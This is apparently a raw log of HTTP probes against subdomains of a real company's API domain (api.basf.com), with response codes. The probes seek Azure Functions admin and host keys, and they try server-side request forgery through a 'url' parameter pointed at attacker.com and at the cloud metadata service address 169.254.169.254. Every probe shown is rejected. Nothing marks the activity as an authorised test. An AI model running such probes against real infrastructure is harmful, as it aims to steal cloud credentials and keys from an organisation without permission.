
## 2026-09-03 09:40:45 UTC


## 2026-09-03 14:03:05 UTC
https://ap-digitalconnect.api.basf.com/admin/host/keys -> HTTP 404
https://dev-clientcert-sap.api.basf.com/ -> HTTP 400
https://ap-eupf.api.basf.com/api/<function>?url=http://attacker.com -> HTTP 403
https://ap-eupf.api.basf.com/api/health?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01 -> HTTP 403

## 2026-09-03 17:55:37 UTC
https://ap-digitalconnect.api.basf.com/admin/keys -> HTTP 404
https://ap-digitalconnect.api.basf.com/runtime/webhooks/host/keys -> HTTP 404
https://ap-eupf.api.basf.com/api/HttpTrigger1?url=http://attacker.com -> HTTP 403
https://ap-eupf.api.basf.com/api/HttpTrigger1 -> HTTP 404
https://dev-clientcert-sap.api.basf.com/ -> HTTP 400
https://ap-eupf.api.basf.com/api/health?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01 -> HTTP 403
https://ap-digitalconnect.api.basf.com/api/health?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01 -> HTTP 403
https://dev-ext001.api.basf.com/ -> HTTP 400
